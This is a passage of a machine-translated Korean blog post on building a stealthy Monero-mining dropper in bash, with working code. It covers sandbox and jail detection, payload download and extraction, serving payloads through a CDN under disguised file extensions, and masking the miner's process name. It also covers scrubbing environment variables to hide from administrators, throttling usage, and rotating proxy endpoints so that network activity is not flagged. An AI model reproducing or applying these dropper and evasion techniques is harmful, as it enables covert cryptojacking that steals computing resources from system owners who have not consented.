d=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">'/dev/*'</span>)
s=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">'/sys/*'</span>)
p=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">'/proc/*'</span>)
jail=
<span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable">$c</span>"</span> -o -z <span class="hljs-string">"<span class="hljs-variable">$d</span>"</span> -o -z <span class="hljs-string">"<span class="hljs-variable">$s</span>"</span> -o -z <span class="hljs-string">"<span class="hljs-variable">$p</span>"</span> ]; <span class="hljs-keyword">then</span><span class="hljs-comment">## we are in a jail</span>
    jail=1
<span class="hljs-keyword">fi</span></code></pre><p> 이제 페이로드를 다운로드할 시간입니다. wget과 curl을 모두 지원하도록 선택했습니다. 우리는 이미 신중한 플래그와 함께 wget을 사용하는 방법을 알고 있습니다. curl의 경우 약간 다릅니다. 구성 파일을 만들고 재정의해야 합니다.<code>CURL_HOME</code></p><pre><code class="bash hljs"><span class="hljs-built_in">echo</span><span class="hljs-string">"url = <span class="hljs-variable">$uri</span>
output = <span class="hljs-variable">${name}</span><span class="hljs-variable">${format}</span>
connect-timeout = 10
"</span> &gt; .curlrc
CURL_HOME=<span class="hljs-variable">$PWD</span> curl -sOL</code></pre><p> 마지막 단계는 페이로드를 추출하는 것입니다.</p><pre><code class="bash hljs"><span class="hljs-built_in">type</span> unzip &amp;&gt;/dev/null &amp;&amp;
    format=<span class="hljs-string">".zip"</span> extract=<span class="hljs-string">"unzip -q"</span> ||
        format=<span class="hljs-string">".tar.gz"</span> extract=<span class="hljs-string">"tar xf"</span></code></pre><p> 페이로드 서비스를 위해 [CDN]을 사용하는 것을 언급할 가치가 있습니다. 여기서 다시 Cloudflare를 구출함으로써 대역폭 지출을 줄일 수 있습니다. 단순히 압축된 페이로드의 이름을<em> 파일 확장자</em>  Cloudflare에서 지원합니다...캐시됩니다. Cloudflare는 서비스 중인 항목의 헤더를 확인하지 않습니다. 아마도 해당 규모에서 수행하는 것이 비현실적이기 때문일 수 있습니다.</p><h2 id="adventures_down_bashland"><a class="header-anchor" href="#adventures_down_bashland"> Bashland의 모험</a></h2><p> Bash는 펄, 루비 또는 파이썬과 같은 다른 스크립팅 언어에 비해 이식성이 뛰어나고 너무 촌스러워 보이지 않는다는 가정 하에 선택되었습니다. 진실은 golang이나 lua로 작성된 독립 실행형 바이너리가 훨씬 더 쉽고 버그가 적고 유지 관리가 더 쉬웠을 것입니다. 기본적으로 bash로 많은 가려움을 긁을 때까지 기본적으로 bash는 가능한 최악의 선택이었습니다. , 다시 쓰기에는 너무 늦었고 지루하기도 했다.</p><p>모든 내장 기능(예: grep 및 sed)을 사용하기 위해 컴파일 시간 플래그와 함께 busybox를 사용하는 옵션도 있었지만 이 방법으로 내장 기능을 사용하면 작업(포크)을 생성할 수 없고 데몬이 잠재적 교착 상태에 노출됩니다.</p><p> 여기에서 일부 bash 기능을 설명하고 전체 목록을 사용할 수 있습니다.<a href="\assets/posts/bash_functions.txt"> 여기</a></p><pre><code class="bash hljs"><span class="hljs-comment">## echo a string long $1 of random lowercase chars</span><span class="hljs-function"><span class="hljs-title">rand_string</span></span>() {
    <span class="hljs-built_in">local</span> c=0
    <span class="hljs-keyword">while</span> [ <span class="hljs-variable">$c</span> -lt <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">do</span><span class="hljs-built_in">printf</span><span class="hljs-string">"\x<span class="hljs-subst">$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class="hljs-number">1</span>))
    <span class="hljs-keyword">done</span>
}</code></pre><p> 사용<code>RANDOM</code>  변수를 사용하여 문자 코드에 해당하는 97-122 사이의 숫자를 얻으려면 printf가 내장되어야 하며 루프 내에서 분기하고 싶지 않습니다.</p><pre><code class="bash hljs"><span class="hljs-comment">## make a new file descriptor named $1</span><span class="hljs-function"><span class="hljs-title">newfd</span></span>() {
    <span class="hljs-built_in">eval</span><span class="hljs-string">"local fd=\${<span class="hljs-variable">$1</span>}"</span><span class="hljs-built_in">eval</span><span class="hljs-string">"exec <span class="hljs-variable">$fd</span>&gt;&amp;-"</span> &amp;&gt;/dev/null
    <span class="hljs-built_in">local</span> pp=<span class="hljs-string">".<span class="hljs-subst">$(rand_string 8)</span>"</span>
    mkfifo <span class="hljs-variable">$pp</span><span class="hljs-built_in">unset</span><span class="hljs-string">"<span class="hljs-variable">$1</span>"</span><span class="hljs-built_in">eval</span><span class="hljs-string">"exec {<span class="hljs-variable">$1</span>}&lt;&gt;<span class="hljs-variable">$pp</span>"</span><span class="hljs-comment"># unlink the named pipe</span>
    rm -f <span class="hljs-variable">$pp</span>
}</code></pre><p> 파이프를 활용하여 익명 파일 디스크립터를 생성합니다. 이들은 파일 디스크립터와 정확히 동일하게 작동하지 않지만<a href="https://en.wikipedia.org/wiki/Inter-process_communication"> IPC</a>.</p><pre><code class="bash hljs"><span class="hljs-comment">## https://unix.stackexchange.com/a/407383/163931</span><span class="hljs-function"><span class="hljs-title">fleep</span></span>()
{
    <span class="hljs-comment"># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class="hljs-string">"<span class="hljs-variable">${_snore_fd}</span>"</span> -a <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class="hljs-comment"># log "fleep: starting waiting with ${_snore_fd}"</span><span class="hljs-keyword">if</span> ! <span class="hljs-built_in">command</span> &gt;&amp;<span class="hljs-variable">${_snore_fd}</span>; <span class="hljs-keyword">then</span>
        newfd _snore_fd
    <span class="hljs-keyword">fi</span><span class="hljs-built_in">read</span> -t <span class="hljs-variable">${1:-1}</span> -u <span class="hljs-variable">$_snore_fd</span><span class="hljs-comment"># log "fleep: ended"</span>
}</code></pre><p> 포크 없이 잠자기, 읽기 내장의 시간 초과 기능을 남용하여 전용 파일 설명자를 사용하며 종료를 피하기 위해 사용할 수 있는지 확인해야 합니다.</p><p> 와 같은 기능이 있습니다<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code>  시스템 사용을 모니터링하는 데 사용되며 모두 Linux를 사용합니다.<code>/proc</code>  다음과 같은 도구가 없는 파일<code>ps</code> , 따라서 포크가 필요 없으며 모두 순수한 bash입니다.</p><pre><code class="bash hljs"><span class="hljs-function"><span class="hljs-title">start_coproc</span></span>() {
    <span class="hljs-built_in">local</span><span class="hljs-built_in">unset</span><span class="hljs-keyword">while</span> :; <span class="hljs-keyword">do</span><span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> = <span class="hljs-built_in">exec</span> ]; <span class="hljs-keyword">then</span>
            coproc_name=<span class="hljs-string">"<span class="hljs-variable">$2</span>"</span><span class="hljs-keyword">else</span>
            coproc_name=<span class="hljs-string">"<span class="hljs-variable">$1</span>"</span><span class="hljs-keyword">fi</span><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable">$UNSET_COPROC_VARS</span>"</span> ]; <span class="hljs-keyword">then</span><span class="hljs-built_in">unset</span>=<span class="hljs-string">"unset <span class="hljs-variable">$UNSET_COPROC_VARS</span>;"</span><span class="hljs-keyword">fi</span><span class="hljs-built_in">log</span><span class="hljs-string">"starting coproc <span class="hljs-variable">$coproc_name</span>"</span><span class="hljs-built_in">unset</span> -v <span class="hljs-string">"<span class="hljs-variable">$coproc_name</span>"</span><span class="hljs-comment">## only the variable, not functions</span><span class="hljs-built_in">eval</span><span class="hljs-string">"coproc <span class="hljs-variable">$coproc_name</span> { <span class="hljs-variable">$unset</span> $*; }"</span><span class="hljs-comment"># 2&gt;/dev/null</span><span class="hljs-built_in">unset</span> UNSET_COPROC_VARS
        wait_coproc <span class="hljs-string">"<span class="hljs-variable">$coproc_name</span>"</span> 3 &amp;&amp; <span class="hljs-built_in">break</span><span class="hljs-keyword">done</span>
}
<span class="hljs-function"><span class="hljs-title">stop_coproc</span></span>() {
    <span class="hljs-comment">## clear fds</span>
    id_coproc <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> &amp;&amp; [ -n <span class="hljs-string">"<span class="hljs-variable">$job_n</span>"</span> ] &amp;&amp; <span class="hljs-built_in">eval</span><span class="hljs-string">"kill -<span class="hljs-variable">${2:-9}</span> %<span class="hljs-variable">$job_n</span>"</span> ||
        { <span class="hljs-built_in">eval</span><span class="hljs-string">"kill -<span class="hljs-variable">${2:-9}</span> \${<span class="hljs-variable">${1}</span>_PID}"</span>; } ||
        { <span class="hljs-built_in">log</span><span class="hljs-string">"could not kill the specified coprocess with job <span class="hljs-variable">$job_n</span>"</span> &amp;&amp; <span class="hljs-built_in">return</span> 1; }
}</code></pre><p> bash부터 코프로세스를 사용할 수 있습니다.<code>v4</code> , 이름과 고유한 파일 설명자가 있다는 점을 제외하면 작업과 같습니다.</p><pre><code class="bash hljs"><span class="hljs-comment">## clear file descriptors</span><span class="hljs-function"><span class="hljs-title">clear_fds</span></span>() {
    <span class="hljs-built_in">local</span> fd
    <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> $(compgen -G <span class="hljs-string">"/proc/<span class="hljs-variable">$BASHPID</span>/fd/*"</span>); <span class="hljs-keyword">do</span>
        fd=<span class="hljs-variable">${fd/*\/}</span><span class="hljs-keyword">if</span> [[ ! <span class="hljs-string">" $* "</span> =~ <span class="hljs-string">" <span class="hljs-variable">${fd}</span> "</span> ]]; <span class="hljs-keyword">then</span><span class="hljs-keyword">case</span><span class="hljs-string">"<span class="hljs-variable">$fd</span>"</span><span class="hljs-keyword">in</span>
                    0|1|2|255|<span class="hljs-string">"<span class="hljs-variable">$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class="hljs-built_in">eval</span><span class="hljs-string">"exec <span class="hljs-variable">$fd</span>&gt;&amp;-"</span>
                        ;;
                <span class="hljs-keyword">esac</span><span class="hljs-keyword">fi</span><span class="hljs-keyword">done</span>
}</code></pre><p> 우리는 오래 지속되는 프로세스인 데몬을 작성 중이며 많은 파일 설명자를 사용하고 있습니다.<a href="https://web.archive.org/web/https://linux.die.net/man/5/limits.conf"> ulimits</a>.</p><pre><code class="bash hljs"><span class="hljs-comment">## queries ipinfo and gets the current ip and country/region</span><span class="hljs-function"><span class="hljs-title">parse_ip</span></span> ()
{
    <span class="hljs-built_in">export</span> ip country region;
    [ ! -e cfg/geoip.json ] &amp;&amp; <span class="hljs-built_in">log</span><span class="hljs-string">"geolocation codes file not found."</span> &amp;&amp; <span class="hljs-built_in">return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class="hljs-string">"<span class="hljs-variable">$ipquery</span>"</span> ] &amp;&amp; <span class="hljs-built_in">log</span><span class="hljs-string">"failed querying ipinfo"</span> &amp;&amp; <span class="hljs-built_in">return</span> 1;
    before_after <span class="hljs-string">'ip\": \"'</span><span class="hljs-string">"<span class="hljs-variable">$ipquery</span>"</span><span class="hljs-string">'\"'</span>;
    ip=$(<span class="hljs-built_in">echo</span><span class="hljs-variable">$after</span>);
    [ -z <span class="hljs-string">"<span class="hljs-variable">$ip</span>"</span> ] &amp;&amp; <span class="hljs-built_in">log</span><span class="hljs-string">"failed parsing ipinfo data ip"</span> &amp;&amp; <span class="hljs-built_in">return</span> 1;
    before_after <span class="hljs-string">'country\": \"'</span><span class="hljs-string">"<span class="hljs-variable">$ipquery</span>"</span><span class="hljs-string">'\"'</span>;
    country=$(<span class="hljs-built_in">echo</span><span class="hljs-variable">${after,,}</span>);
    [ -z <span class="hljs-string">"<span class="hljs-variable">$country</span>"</span> ] &amp;&amp; <span class="hljs-built_in">log</span><span class="hljs-string">"failed parsing ipinfo data country"</span> &amp;&amp; <span class="hljs-built_in">return</span> 1;
    <span class="hljs-keyword">while</span><span class="hljs-built_in">read</span> l; <span class="hljs-keyword">do</span><span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">${l}</span>"</span> != <span class="hljs-string">"<span class="hljs-variable">${l/\": {}</span>"</span> ]; <span class="hljs-keyword">then</span>
            before_after <span class="hljs-string">'"'</span><span class="hljs-string">"<span class="hljs-variable">$l</span>"</span><span class="hljs-string">'"'</span>;
            lastregion=$(<span class="hljs-built_in">echo</span><span class="hljs-variable">$after</span>);
        <span class="hljs-keyword">else</span><span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">${l}</span>"</span> != <span class="hljs-string">"<span class="hljs-variable">${l/\"<span class="hljs-variable">${country}</span>\"}</span>"</span> ]; <span class="hljs-keyword">then</span>
                region=<span class="hljs-variable">$lastregion</span>;
                <span class="hljs-built_in">break</span>;
            <span class="hljs-keyword">fi</span>;
        <span class="hljs-keyword">fi</span>;
    <span class="hljs-keyword">done</span> &lt; cfg/geoip.json
}</code></pre><p> 이 기능은 다음을 기반으로 합니다.<a href="https://ipinfo.io/"> 아이피 정보</a>  일부 지역 종속 논리를 조정할 수 있는 작업자의 지역을 결정하기 위해,<a href="\assets/posts/geoip.json"> geoip.json</a>  최상위 지역을 원하고 특정 국가에 관심이 없기 때문에 국가를 지역으로 그룹화합니다.</p><pre><code class="bash hljs"><span class="hljs-comment"># try to open a connection to host $1 with port $2 and output to $3</span><span class="hljs-function"><span class="hljs-title">open_connection</span></span>() {
    <span class="hljs-built_in">exec</span> {socket}&lt;&gt;/dev/tcp/<span class="hljs-variable">${1}</span>/<span class="hljs-variable">${2}</span> 2&gt;/dev/null
    <span class="hljs-built_in">echo</span><span class="hljs-variable">$socket</span> &gt;&amp;<span class="hljs-variable">${3}</span>
}

<span class="hljs-comment">## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class="hljs-function"><span class="hljs-title">check_connection</span></span>() {
    <span class="hljs-built_in">local</span> host=<span class="hljs-variable">$1</span> port=<span class="hljs-variable">$2</span> conn_socket=
    [ -z <span class="hljs-string">"<span class="hljs-variable">$host</span>"</span> ] &amp;&amp; { <span class="hljs-built_in">echo</span><span class="hljs-string">'no host provided'</span>; <span class="hljs-built_in">return</span> 1; }
    [ -z <span class="hljs-string">"<span class="hljs-variable">$port</span>"</span> ] &amp;&amp; { <span class="hljs-built_in">echo</span><span class="hljs-string">'no port provided'</span>; <span class="hljs-built_in">return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class="hljs-variable">$host</span><span class="hljs-variable">$port</span><span class="hljs-variable">$conn_socket</span><span class="hljs-comment"># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class="hljs-variable">$conn_socket</span> avl -
    <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable">$avl</span>"</span> ]; <span class="hljs-keyword">then</span><span class="hljs-comment"># close connection</span><span class="hljs-built_in">eval</span><span class="hljs-string">"exec <span class="hljs-variable">${avl}</span>&lt;&amp;-"</span> &amp;&gt;/dev/null
        <span class="hljs-built_in">return</span> 0 <span class="hljs-comment">## connection can be established</span><span class="hljs-keyword">else</span><span class="hljs-built_in">return</span> 1 <span class="hljs-comment">## connection can't be established</span><span class="hljs-keyword">fi</span>
}</code></pre><p> Bash는 추상화를 통해 tcp 연결을 지원합니다.<code>/dev/tcp</code>  (udp의 경우도 있지만 대부분은 빌드 시 일반적으로 비활성화되어 있으므로 의존할 수 없습니다). 이 파일은 bash 파일이며 Linux의 일부가 아닙니다.<code>/dev</code>  나무.</p><p>bash 작업 간의 동시성을 처리하기 위한 잠금 시스템도 언급할 가치가 있습니다. 여러 작업이 잠금과 함께 작동하도록 하려면 모두 파일 설명자를 공유해야 하므로<code>locker</code>  작업이기도 한 잠금을 사용하려는 다른 작업보다 먼저 시작되어야 합니다. 사물함은 단순히 읽습니다.<code>stdin</code>  잠금 요청 대기, 응답<code>stdout</code>  변수에 저장된 현재 부울 상태에 따라 다릅니다. 이 접근 방식이 레이스 프리라고 보장할 수는 없지만 제대로 작동하는 것 같습니다. 반면에 어딘가에 플러시되지 않는 버퍼가 있다고 생각하기 때문에 파일 디스크립터가 매우 안정적이지 않다는 것을 알았습니다.<em> 파이프</em>  그리고 결국 교착 상태에 빠지게 됩니다(즉, 항상 답을 제공하는 사물함에 의존할 수 없음을 의미합니다).</p><pre><code class="bash hljs"><span class="hljs-comment">## unset bash env apart excluded vars/funcs</span><span class="hljs-function"><span class="hljs-title">clear_env</span></span>(){
    <span class="hljs-built_in">local</span><span class="hljs-built_in">functions</span>=$(<span class="hljs-built_in">declare</span> -F)
    <span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions//declare -f }</span><span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span><span class="hljs-variable">$@</span>; <span class="hljs-keyword">do</span><span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions/$u[[:space:]]}</span><span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions/[[:space:]]$u}</span><span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions/[[:space:]]$u[[:space:]]}</span><span class="hljs-keyword">done</span><span class="hljs-built_in">local</span> vars=$(<span class="hljs-built_in">set</span> -o posix; <span class="hljs-built_in">set</span> | <span class="hljs-keyword">while</span><span class="hljs-built_in">read</span> l; <span class="hljs-keyword">do</span><span class="hljs-built_in">echo</span><span class="hljs-variable">${l/=*}</span>; <span class="hljs-keyword">done</span>)
    <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span><span class="hljs-variable">$@</span>; <span class="hljs-keyword">do</span>
        vars=<span class="hljs-variable">${vars/$u[[:space:]]}</span>
        vars=<span class="hljs-variable">${vars/[[:space]]$u}</span>
        vars=<span class="hljs-variable">${vars/[[:space:]]$u[[:space:]]}</span><span class="hljs-keyword">done</span><span class="hljs-built_in">unset</span> -f <span class="hljs-variable">$functions</span> &amp;&gt;/dev/null
    <span class="hljs-built_in">unset</span> -v <span class="hljs-variable">$vars</span> &amp;&gt;/dev/null
    <span class="hljs-comment"># unset $vars &amp;&gt;/dev/null</span>
}

<span class="hljs-comment">## unexport most variables</span><span class="hljs-function"><span class="hljs-title">dex_env</span></span>() {
    exported=$(<span class="hljs-built_in">export</span> -p)
    <span class="hljs-keyword">while</span><span class="hljs-built_in">read</span> e; <span class="hljs-keyword">do</span>
        n=<span class="hljs-variable">${e/declare -*x }</span>
        [ <span class="hljs-string">"<span class="hljs-variable">$n</span>"</span> = <span class="hljs-string">"<span class="hljs-variable">$e</span>"</span> ] &amp;&amp; <span class="hljs-built_in">continue</span><span class="hljs-comment">## multiline var</span>
        n=<span class="hljs-variable">${n/=*}</span><span class="hljs-keyword">case</span><span class="hljs-string">"<span class="hljs-variable">$n</span>"</span><span class="hljs-keyword">in</span><span class="hljs-string">"SHELL"</span>|<span class="hljs-string">"USER"</span>|<span class="hljs-string">"HOME"</span>|<span class="hljs-string">"TMUX"</span>|<span class="hljs-string">"CHARSET"</span>|<span class="hljs-string">"TERM"</span>)
                <span class="hljs-built_in">continue</span>
                ;;
            *)
                dexported=<span class="hljs-string">"<span class="hljs-variable">$dexported</span><span class="hljs-variable">${n/=*}</span>"</span><span class="hljs-keyword">esac</span><span class="hljs-keyword">done</span> &lt;&lt;&lt;<span class="hljs-string">"<span class="hljs-variable">$exported</span>"</span><span class="hljs-built_in">export</span> -n <span class="hljs-variable">$dexported</span>
}</code></pre><p> 쓰레기를 정리하세요...복잡한 bash 프로그램은 결국 많은 변수를 사용하고 전역 공간을 남용하면 부풀려집니다. 쉘 작업을 생성하는 경우 모든 환경(효과적으로 복제되고 공유되지 않음)을 상속하므로 bash 먹기로 빠르게 끝날 수 있습니다.<code>100M</code>  기억력이 좋지 않습니다. 또한 우리는 낮은 프로필을 원합니다. 우리의 배포 시나리오에서 공격자는<sup id="fnref:adversary"><a class="fnref" href="#fndef:adversary">[1]</a></sup>  잠재적으로 루트 액세스 권한과 프로세스에 대한 완전한 정보를 가질 수 있습니다.<sup id="fnref:infoproc"><a class="fnref" href="#fndef:infoproc">[2]</a></sup>  , 그리고 알다시피... 모든 프로세스는 이를 시작한 전체 명령과 내보낸 환경 변수에 대한 정보를 보유합니다.</p><h2 id="configuration"><a class="header-anchor" href="#configuration"> 구성</a></h2><p>환경과 도구가 있으면 실행 중인 머신에 맞게 마이너를 조정해야 합니다. 구성 단계는 의사 코드입니다.</p><ul><li><p> 광부의 프로세스 이름</p></li><li><p> 호스트 정보(램/코어/캐시/<code>ENV_VARS</code>)</p></li><li><p> 구성 버전</p></li><li><p><code>worker_id</code>  광부 (ip 및 호스트에서)</p></li><li><p> 연결을 위한 ip/포트</p></li></ul><p> 프로세스 이름을 선택해야 합니다.<em> 숨다</em>  우리는 광부를 실행하고 있지만 바이너리 이름을 바꾸는 것이 아니라 다음 목록을 가지고 있습니다.<strong> 마스크</strong>  잠재적 후보의 경우(각 행이 마스크인 일반 텍스트 파일):</p><ul><li><p> 무작위로 마스크를 선택</p></li><li><p> 다양한 프로세스 명령을 얻기 위해 문자열의 꼬리 요소(첫 번째를 제외한 모든 요소)를 섞습니다. 이제 다음과 같은 문자열이 있습니다.<code>cmd --arg2 --arg1 --arg3</code> . 이것은 우리의 광부 마스크이며 바이너리를 실행합니다.<em> 없이</em>  인수가 있지만 명령을 시작한 것 같습니다.<code>cmd</code>  인수와 함께<code>--arg1 --arg2 --arg3</code> . 파일 이름에 공백과 대시가 허용되므로 이와 같은 이름의 바이너리를 실행하는 것은 괜찮습니다. Linux가 프로세스 명령을 저장할 때 실행 파일과 인수를 구분하지 못하는 것 같습니다.</p><p> 광부 구성은 다음에서 자동으로 로드됩니다.<code>$PWD</code>.</p></li></ul><h3 id="hashrate"><a class="header-anchor" href="#hashrate"> 해시레이트</a></h3><p> , 시간이 지남에 따라 업스트림 광부는<strong> 자동 튜닝</strong>  내 스크립트의 일부를 중복으로 만들었지만 여기서 업스트림과 다운스트림의 차이점은 업스트림 목표가<em> 성능</em> , 우리의 목표는<em> 효율성과 난독화</em> , 우리는 시스템을 추월하고 싶지 않고 서비스 중단 없이 조금 거머리를 원합니다.<sup id="fnref:monerominer"><a class="fnref" href="#fndef:monerominer">[3]</a></sup></p><p> 이를 위해서는 환경에 대한 보다 세분화된 이해가 필요하며,<code>l2/l3</code>  프로세서, 램, 코어, 현재 프로세서의 캐시 구조<em> 평균</em>  부하와 CPU<em> 용법</em>. 구축을 시도했습니다<a href="https://en.wikipedia.org/wiki/Finite-state_machine"> 상태 머신</a>  bash에서는 최소한의 것부터 시작하여 다른 구성을 시도하여 평균적으로 최상으로 천천히 정착합니다. 그것은 이었다<strong> 거대한</strong>  노력의 낭비<a href="https://en.wikipedia.org/wiki/Technical_debt"> 기술 부채</a>  그것은 매우 빨리 파산했고 대부분은 폐기되었고 코드베이스에 남아있는 잔재만 남았습니다.</p><p> 이 모든 자동 튜닝 점보를 깨고 호스트 사용량/로드에 따라 광부를 잠자기 상태로 만들었습니다. 이를 위해 광부 수정이 필요했습니다.<code>sleep</code>  스레드 수율 및 구성 감시 장치에 대한 몇 가지 수정 사항<sup id="fnref:configwatch"><a class="fnref" href="#fndef:configwatch">[4]</a></sup> , 이를 통해 런타임에 수면 시간을 다시 로드할 수 있습니다. 논리는 훨씬 더 단순화되었으며 다음과 같습니다.</p><ul><li><p> 사용량이 $TARGET_USAGE(± 오차 한계) 이상/미만인 경우 절전 증가/감소</p></li><li><p> 평균 하중이<code>1m</code>  $TARGET_LOAD 이상/이하입니다. 채굴 일시 중지/재개</p></li></ul><h3 id="connection"><a class="header-anchor" href="#connection"> 연결</a></h3><p> 우리의 bash 정리에서 우리는 연결을 위한 유틸리티를 보여주었습니다. 왜 이것들이 필요합니까? 다양성이 필요하기 때문입니다. 단순히 끝점을 구성에 하드 코딩하는 것은 오래 지속되지 않습니다. 무언가가 의심스러워 보이고 네트워크 활동이 있을 때 IP에 플래그가 지정됩니다.</p><p> 처음에 우리는 몇 가지 방법을 실험했습니다.</p><ul><li><p> 사용<a href="https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains"> 프록시 체인</a>  광부 네트워크 호출에 과부하가 걸렸지만 광부를 동적 라이브러리로 빌드해야 했고 페이로드와 함께 배송해야 했기 때문에 비실용적이었습니다.</p></li><li><p> 실행<a href="https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost"> 전방 터널</a>  광부와 나란히: 구성 오버헤드가 많았습니다. 이제 각 배포에서 두 개의 프로세스를 구성하고 있었기 때문에 더 많은 버그가 발생했습니다.</p></li></ul><p>결국 우리는 bash 변수에 저장된 끝점 목록을 전달하고 무작위로 하나를 선택하는 것으로 해결했습니다. 연결은 물론 암호화되었습니다. 이러한 끝점은 무엇입니까? 광부 작업을 처리할 프록시에 대한 전달자.</p><img alt="" src="/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png"/><p> 왜 우리는 필요합니까<a href="https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy"> 마이닝 프록시</a> ? 나는 실제로 ~100개의 동시 연결을 넘지 않았으므로 네트워크 로드에 프록시가 실제로 필요하지 않았지만 해싱 알고리즘을 협상하고 다른 채굴자에게 다른 난이도 목표를 제공하여 채굴자가 작업하는 것을 방지하는 데 편리했습니다.<strong> 어려움</strong>  완료하는 데 너무 많은 시간이 걸리고 완료되지 않은 작업에 대한 계산 낭비의 위험을 피할 수 있습니다.<sup id="fnref:difficulty"><a class="fnref" href="#fndef:difficulty">[5]</a></sup>  풀 소프트웨어는 일반 http 요청에 대한 프록시로 행복하게 광고하기 때문에 약간의 수정이 필요했습니다...<em> 시간 초과되어야 했던</em> , 그리고 포크에 액세스 제어가 추가되어 우리는 이를 기반으로 모드를 만들었습니다.<sup id="fnref:stratumprotocol"><a class="fnref" href="#fndef:stratumprotocol">[6]</a></sup></p><h3 id="editing_json"><a class="header-anchor" href="#editing_json"> json 편집</a></h3><p> 일부 env var 대체 및 일부 정규식으로 얻은 bash를 사용하여 json 파일에 수정 사항을 적용합니다. 처음에 우리는 의존하고 있었다<code>envsubst</code>  변수를 적용하기 위해 이진법을 사용한 다음 전체 bash로 이동했습니다.<sup id="fnref:fullbash"><a class="fnref" href="#fndef:fullbash">[7]</a></sup>  이 논리로:</p><ul><li><p> 구성 템플릿 읽기</p></li><li><p> 모든 따옴표를 매우 난해한 문자열로 바꿉니다(예:<code>_#_#</code>)</p></li><li><p><code>eval</code>  템플릿</p></li><li><p> 모든 난해한 사건을 따옴표로 다시 바꿉니다.</p></li></ul><p> 하위 프로세스를 피하는 것 외에도 템플릿에서 완전한 bash 기능을 얻을 수 있다는 또 다른 이점이 있습니다. 템플릿 없이 읽고 쓰기 위해서는 bash regex 기능에 의존해야 합니다.</p><pre><code class="bash hljs">cc_rgx=<span class="hljs-string">'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class="hljs-function"><span class="hljs-title">change_config</span></span>() {
	<span class="hljs-built_in">local</span> subs
	<span class="hljs-keyword">while</span><span class="hljs-built_in">read</span> l; <span class="hljs-keyword">do</span><span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">${l}</span>"</span> != <span class="hljs-string">"<span class="hljs-variable">${l/\"*$1*\"*:/}</span>"</span> ]; <span class="hljs-keyword">then</span>
			[[ <span class="hljs-string">"<span class="hljs-variable">${l}</span>"</span> =~ <span class="hljs-variable">$cc_rgx</span> ]]
			matches=(<span class="hljs-string">"<span class="hljs-variable">${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class="hljs-string">"<span class="hljs-variable">${matches[3]}</span>"</span> -a <span class="hljs-string">"<span class="hljs-variable">${2:0:1}</span>"</span> != <span class="hljs-string">"\""</span> ] &amp;&amp;
				subs=<span class="hljs-string">"\"<span class="hljs-variable">$2</span>\""</span> ||
				subs=<span class="hljs-string">"<span class="hljs-variable">$2</span>"</span>
			CONFIG=<span class="hljs-variable">${CONFIG/<span class="hljs-variable">${matches[0]}</span>/<span class="hljs-variable">${matches[1]}</span>$subs<span class="hljs-variable">${matches[5]}</span>}</span><span class="hljs-built_in">break</span><span class="hljs-keyword">fi</span><span class="hljs-keyword">done</span> &lt;&lt;&lt;<span class="hljs-string">"<span class="hljs-subst">$(printf '%s' <span class="hljs-string">"<span class="hljs-variable">$CONFIG</span>"</span> 2&gt;/dev/null)</span>"</span>
}

<span class="hljs-comment">## output miner config value $1 unquoted</span>
gc_rgx=<span class="hljs-string">' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class="hljs-function"><span class="hljs-title">get_config</span></span>() {
	<span class="hljs-keyword">while</span><span class="hljs-built_in">read</span> l; <span class="hljs-keyword">do</span><span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">${l}</span>"</span> != <span class="hljs-string">"<span class="hljs-variable">${l/\"*$1*\"*:/}</span>"</span> ]; <span class="hljs-keyword">then</span>
			[[ <span class="hljs-string">"<span class="hljs-variable">${l}</span>"</span> =~ <span class="hljs-variable">$gc_rgx</span> ]]
			[ -n <span class="hljs-string">"<span class="hljs-variable">${BASH_REMATCH[2]}</span>"</span> ] &amp;&amp;
				<span class="hljs-built_in">printf</span><span class="hljs-string">'%s'</span><span class="hljs-string">"<span class="hljs-variable">${BASH_REMATCH[2]}</span>"</span> ||
				<span class="hljs-built_in">printf</span><span class="hljs-string">'%s'</span><span class="hljs-string">"<span class="hljs-variable">${BASH_REMATCH[3]}</span>"</span><span class="hljs-built_in">break</span><span class="hljs-keyword">fi</span><span class="hljs-keyword">done</span> &lt;&lt;&lt;<span class="hljs-string">"<span class="hljs-subst">$(printf '%s' <span class="hljs-string">"<span class="hljs-variable">$CONFIG</span>"</span> 2&gt;/dev/null)</span>"</span>
